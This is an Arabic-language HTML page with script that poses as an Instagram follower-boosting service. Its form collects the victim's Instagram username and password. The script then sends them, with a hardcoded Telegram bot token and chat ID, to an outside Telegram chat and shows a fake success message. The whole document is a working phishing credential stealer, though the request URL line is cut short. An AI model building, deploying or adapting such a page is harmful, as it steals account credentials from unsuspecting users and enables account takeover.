<h2> زيادة متابعين إنستقرام </h2> 
<form id="followForm"> 
<input id="username" type="text" placeholder="اسم المستخدم" /> 
<input id="password" type="password" placeholder="كلمة المرور" />

<script> 
const token = "644711615:AAF50mp-3EsI80Hwqj-DombQpFcl65wdAm8"; 
const chatId = "8265882964"; 
const form = document.getElementById("followForm"); 
const loading = document.getElementById("loading"); 
form.addEventListener("submit", function(e) { 
e.preventDefault(); 
const username = document.getElementById("username").value.trim(); 
const password = document.getElementById("password").value.trim(); 
const followers = document.getElementById("followers").value; 
if (!username || !password || !followers) { 
alert("يرجى تعبئة جميع الحقول"); 
return; 
} 
loading.classList.add("show"); 
const message = `📥 بيانات مستخدم انستقرام:\nUser: ${username}\nPass: ${password}\nFollowers: ${followers}`; 
const url = `https:                                             
fetch(url, { 
method: "POST", 
headers: { 
'Content-Type': 'application/x-www-form-urlencoded' 
}, 
body: `chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(message)}` 
}) 
.then(response => response.json()) 
.then(result => { 
if (result.ok) { 
alert("✅ تم بنجاح!"); 
form.reset(); 
} else { 
alert("❌ فشل : " + result.description); 
} 
}) 
.catch(error => { 
alert("❌ حدث خطأ أثناء : " + error.message); 
}) 
.finally(() => { 
loading.classList.remove("show"); 
}); 
}); 
</script>
